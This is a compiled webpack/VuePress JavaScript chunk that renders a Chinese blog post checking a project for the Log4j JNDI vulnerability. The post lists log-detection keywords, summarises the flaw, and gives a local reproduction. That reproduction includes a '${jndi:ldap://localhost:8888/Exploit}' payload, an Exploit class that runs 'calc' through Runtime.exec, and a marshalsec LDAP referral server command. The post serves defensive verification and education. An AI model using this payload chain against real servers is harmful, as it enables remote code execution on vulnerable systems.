(window.webpackJsonp=window.webpackJsonp||[]).push([[309],{686:function(t,a,s){"use strict";s.r(a);var n=s(26),e=Object(n.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"项目log4j漏洞问题排查"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#项目log4j漏洞问题排查"}},[t._v("#")]),t._v(" 项目log4j漏洞问题排查")]),t._v(" "),s("h2",{attrs:{id:"_1-自检-项目是否存在log4g漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-自检-项目是否存在log4g漏洞"}},[t._v("#")]),t._v(" 1. 自检（项目是否存在log4g漏洞）")]),t._v(" "),s("p",[s("strong",[t._v("结论：不存在该漏洞")])]),t._v(" "),s("ol",[s("li",[t._v("项目并没有引用到log4g-core")]),t._v(" "),s("li",[t._v("也没有打印会引起该漏洞的关键字或规则")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222121156841.png",alt:"image-20211222121156841"}})]),t._v(" "),s("h3",{attrs:{id:"_1-1-针对漏洞的自定义规则"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-1-针对漏洞的自定义规则"}},[t._v("#")]),t._v(" 1.1 针对漏洞的自定义规则")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("规则")]),t._v(" "),s("th",[t._v("使用情况")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("tcp payload")]),t._v(" "),s("td",[t._v("未使用")])]),t._v(" "),s("tr",[s("td",[t._v("http msgbody")]),t._v(" "),s("td",[t._v("未使用")])])])]),t._v(" "),s("h3",{attrs:{id:"_1-2-日志排查关键字"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-日志排查关键字"}},[t._v("#")]),t._v(" 1.2 日志排查关键字")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("关键字")]),t._v(" "),s("th",[t._v("使用情况")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("Javax. naming Communicationexception")]),t._v(" "),s("td",[t._v("未使用")])]),t._v(" "),s("tr",[s("td",[t._v("Javax. naming. Namingexception: problem generating object using object factory")]),t._v(" "),s("td",[t._v("未使用")])]),t._v(" "),s("tr",[s("td",[t._v('Error looking up JNDI resource"关键字进行排查')]),t._v(" "),s("td",[t._v("未使用")])]),t._v(" "),s("tr",[s("td",[t._v("${jndi: ladp或 rmi")]),t._v(" "),s("td",[t._v("未使用")])]),t._v(" "),s("tr",[s("td",[t._v("getobjectfactoryfromreferenc Idapurl Context hdil ookup等与jnd调用相关的堆栈信息。")]),t._v(" "),s("td",[t._v("未使用")])])])]),t._v(" "),s("h2",{attrs:{id:"_2-log4j漏洞概述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-log4j漏洞概述"}},[t._v("#")]),t._v(" 2. log4j漏洞概述")]),t._v(" "),s("p",[t._v("该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。")]),t._v(" "),s("h2",{attrs:{id:"_3-影响范围"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_3-影响范围"}},[t._v("#")]),t._v(" 3. 影响范围")]),t._v(" "),s("p",[t._v("Apache Log4j 2.x <= 2.15.0-rc1")]),t._v(" "),s("h2",{attrs:{id:"_4-复现demo"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-复现demo"}},[t._v("#")]),t._v(" 4. 复现demo")]),t._v(" "),s("h3",{attrs:{id:"_4-1-新建maven项目"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-1-新建maven项目"}},[t._v("#")]),t._v(" 4.1 新建maven项目")]),t._v(" "),s("p",[t._v("创建一个新的maven项目，并导入Log4j的依赖包")]),t._v(" "),s("div",{staticClass:"language-xml extra-class"},[s("pre",{pre:!0,attrs:{class:"language-xml"}},[s("code",[t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--   bug版本log4j-core-2.14.1    --\x3e")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            \t"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("org.apache.logging.log4j"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("log4j-core"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("2.14.1"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n        "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--   已修复版本log4j-core-2.17.0    --\x3e")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--        <dependency>--\x3e")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--            <groupId>org.apache.logging.log4j</groupId>--\x3e")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--            <artifactId>log4j-core</artifactId>--\x3e")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--            <version>2.17.0</version>--\x3e")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--        </dependency>--\x3e")]),t._v("\n")])])]),s("h3",{attrs:{id:"_4-2-漏洞利用"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-2-漏洞利用"}},[t._v("#")]),t._v(" 4.2 漏洞利用")]),t._v(" "),s("h4",{attrs:{id:"_4-2-1-使用poc测试"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-2-1-使用poc测试"}},[t._v("#")]),t._v(" "),s("strong",[t._v("4.2.1 使用POC测试")])]),t._v(" "),s("div",{staticClass:"language-java extra-class"},[s("pre",{pre:!0,attrs:{class:"language-java"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("org"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("apache"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("logging"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("log4j"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")])]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("LogManager")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("org"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("apache"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("logging"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("log4j"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")])]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Logger")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("LogTest")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("static")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("final")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Logger")]),t._v(" logger "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("LogManager")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getLogger")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("static")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("String")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" args"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        logger"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("error")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"${jndi:ldap://localhost:8888/Exploit}"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),s("h4",{attrs:{id:"_4-2-2-编译一恶意类exploit-class"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-2-2-编译一恶意类exploit-class"}},[t._v("#")]),t._v(" 4.2.2 "),s("strong",[t._v("编译一恶意类Exploit.class")])]),t._v(" "),s("p",[t._v("首先新建exp.java，然后编译为class文件")]),t._v(" "),s("div",{staticClass:"language-java extra-class"},[s("pre",{pre:!0,attrs:{class:"language-java"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Exploit")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("static")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("System")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("err"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("println")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Pwned"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("try")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("String")]),t._v(" cmds "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"calc"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n            "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Runtime")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getRuntime")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cmds"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("catch")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Exception")]),t._v(" e "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n            e"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("printStackTrace")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\njavac exp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("java\n")])])]),s("h4",{attrs:{id:"_4-2-3-使用marshalsec-0-0-3-snapshot-all-jar本地开启一个ldap服务"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-2-3-使用marshalsec-0-0-3-snapshot-all-jar本地开启一个ldap服务"}},[t._v("#")]),t._v(" 4.2.3 "),s("strong",[t._v("使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务")])]),t._v(" "),s("div",{staticClass:"language-mipsasm extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer\n"http://127.0.0.1:7777/#Exploit" 8888\n')])])]),s("h4",{attrs:{id:"_4-2-3-运行poc-java-即可访问恶意类并执行写在其中的-calc-命令"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-2-3-运行poc-java-即可访问恶意类并执行写在其中的-calc-命令"}},[t._v("#")]),t._v(' 4.2.3 运行poc.java，即可访问恶意类并执行写在其中的"calc"命令')]),t._v(" "),s("p",[s("img",{attrs:{src:"https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124406317.png",alt:"image-20211222124406317"}})]),t._v(" "),s("h3",{attrs:{id:"_4-3-验证测试"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-3-验证测试"}},[t._v("#")]),t._v(" 4.3 验证测试")]),t._v(" "),s("h4",{attrs:{id:"_4-3-1-bug版本log4j-core-2-14-1"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-3-1-bug版本log4j-core-2-14-1"}},[t._v("#")]),t._v(" 4.3.1 bug版本log4j-core-2.14.1")]),t._v(" "),s("p",[t._v("打印的日志会调用jndi")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124709509.png",alt:"image-20211222124709509"}})]),t._v(" "),s("p",[s("img",{attrs:{src:"https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124917358.png",alt:"image-20211222124917358"}})]),t._v(" "),s("h4",{attrs:{id:"_4-3-2-已修复版本log4j-core-2-17-0"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-3-2-已修复版本log4j-core-2-17-0"}},[t._v("#")]),t._v(" 4.3.2 已修复版本log4j-core-2.17.0")]),t._v(" "),s("p",[t._v("已修复版本就变成单纯的打印日志了")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124814229.png",alt:"image-20211222124814229"}})]),t._v(" "),s("h2",{attrs:{id:"_5-项目验证"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_5-项目验证"}},[t._v("#")]),t._v(" 5. 项目验证")]),t._v(" "),s("p",[t._v("项目在log 中的jdni，并不会执行远程调用")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222125006483.png",alt:"image-20211222125006483"}})]),t._v(" "),s("h2",{attrs:{id:"参考文章"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#参考文章"}},[t._v("#")]),t._v(" 参考文章")]),t._v(" "),s("p",[s("a",{attrs:{href:"https://segmentfault.com/a/1190000041117219",target:"_blank",rel:"noopener noreferrer"}},[t._v("手把手复现了 Log4j2 漏洞，太可怕了。。"),s("OutboundLink")],1)])])}),[],!1,null,null,null);a.default=e.exports}}]);